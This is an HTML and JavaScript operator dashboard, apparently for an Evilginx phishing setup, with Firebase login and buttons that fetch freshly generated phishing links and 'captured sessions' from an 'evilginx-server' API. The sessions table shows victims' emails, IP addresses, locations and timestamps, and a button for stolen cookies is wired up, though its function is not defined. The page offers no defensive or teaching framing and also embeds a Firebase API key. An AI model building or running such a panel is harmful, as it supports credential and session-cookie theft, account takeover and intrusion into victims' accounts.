<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #fdfbfb 0%, #ebedee 100%);
        }
    </style>
</head>
<body class="h-screen flex">
    <aside class="w-64 bg-gray-900 text-white p-6">
        <h2 class="text-2xl font-bold text-center mb-6">Dashboard</h2>
        <nav>
            <button onclick="generateLink()" class="w-full mb-3 bg-blue-500 py-2 rounded text-white">Generate Link</button>
            <button onclick="loadCapturedSessions()" class="w-full mb-3 bg-green-500 py-2 rounded text-white">Captured Sessions</button>
            <button onclick="loadCookies()" class="w-full mb-3 bg-yellow-500 py-2 rounded text-white">Cookies</button>
            <button onclick="logout()" class="w-full bg-red-500 py-2 rounded text-white">Logout</button>
        </nav>
    </aside>

    <main class="flex-grow p-6">
        <h2 class="text-2xl font-semibold mb-4">Captured Sessions</h2>
        <table class="w-full border-collapse border border-gray-300">
            <thead class="bg-gray-200">
                <tr>
                    <th class="border border-gray-300 px-4 py-2">Email</th>
                    <th class="border border-gray-300 px-4 py-2">IP</th>
                    <th class="border border-gray-300 px-4 py-2">Location</th>
                    <th class="border border-gray-300 px-4 py-2">Timestamp</th>
                </tr>
            </thead>
            <tbody id="sessions-table">
                <tr><td colspan="4" class="text-center py-2">No data available.</td></tr>
            </tbody>
        </table>
    </main>

    <script>
        firebase.initializeApp({
            apiKey: "AIzaSyDiNWtXm4oHQ6NpHPiLJjV4EDgU7yUQjq0",
            authDomain: "panel-auth-134b7.firebaseapp.com",
            projectId: "panel-auth-134b7",
            storageBucket: "panel-auth-134b7.appspot.com",
            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
            appId: "YOUR_APP_ID"
        });

        const auth = firebase.auth();

        auth.onAuthStateChanged((user) => {
            if (!user) {
                window.location.href = "index.html";
            }
        });

        function logout() {
            auth.signOut().then(() => {
                window.location.href = "index.html";
            }).catch((error) => {
                console.error("Logout failed: ", error.message);
            });
        }

        function generateLink() {
            fetch("http://evilginx-server/api/generate")
                .then(response => response.json())
                .then(data => alert("Generated Link: " + data.link))
                .catch(error => console.error("Error generating link:", error));
        }

        function loadCapturedSessions() {
            fetch("http://evilginx-server/api/captured_sessions")
                .then(response => response.json())
                .then(data => {
                    let table = document.getElementById("sessions-table");
                    table.innerHTML = "";
                    data.forEach(session => {
                        let row = `<tr>
                            <td class="border px-4 py-2">${session.email}</td>
                            <td class="border px-4 py-2">${session.ip}</td>
                            <td class="border px-4 py-2">${session.location}</td>
                            <td class="border px-4 py-2">${session.timestamp}</td>
                        </tr>`;
                        table.innerHTML += row;
                    });
                })
                .catch(error => console.error("Error loading sessions:", error));
        }
    </script>
</body>
</html>
